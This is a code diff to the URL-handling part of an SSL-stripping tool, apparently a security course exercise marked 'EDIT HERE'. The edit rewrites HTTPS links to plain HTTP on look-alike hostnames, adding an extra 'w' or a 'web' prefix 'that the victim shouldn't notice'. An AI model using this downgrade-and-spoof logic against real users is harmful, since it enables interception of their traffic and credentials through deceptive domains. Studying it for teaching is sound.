@@ -57,24 +57,24 @@ class URLMonitor:
             port = host[portIndex + 1:]
             if len(port) == 0:
                 port = 443
-
+        fake_domain = ''
+        # EDIT HERE:
+        # if host starts with "www." add a 4th w
+        # otherwise if there's no "www." at the beginning add something
+        # that the victim shouldn't notice (like "web")
         if host[:4] == "www.":
-            # self.substitution is a dictionary that maps the real hostname to the spoofed one.
-            # the association real->spoofed host will be used to replace the links in the page with these ones
-            # You have to add an entry that maps the real host with the spoofed one
-            # self.read is a dictionary that maps the spoofed hostname to the real one.
-            # the association spoofed-> real host (inverse of the previous) will be used to manage the headers and reply to the client
-            # You have to add an entry that maps the spoofed host with the real one
-            self.substitution[host] = "w" + host
-            self.real["w" + host] = host
-        logging.debug("LEO: ssl host      (%s) tokenized (%s)" % (host, self.substitution[host]))
-
+            # You have to save in fake_domain the spoofed hostname
+            fake_domain = "w" + host
+        else:
+            fake_domain = "web" + host
+        # STOP EDIT HERE
+        logging.debug("LEO: ssl host      (%s) tokenized (%s)" % (host, fake_domain))
         url = 'http://' + host + path
-        # logging.debug("LEO stripped URL: %s %s"%(client, url))
-
+        self.real[fake_domain] = host
         self.strippedURLs.add((client, url))
         self.strippedURLPorts[(client, url)] = int(port)
-        return 'http://' + self.substitution[host] + path
+
+        return 'http://' + fake_domain + path
 
     def setFaviconSpoofing(self, faviconSpoofing):
         self.faviconSpoofing = faviconSpoofing
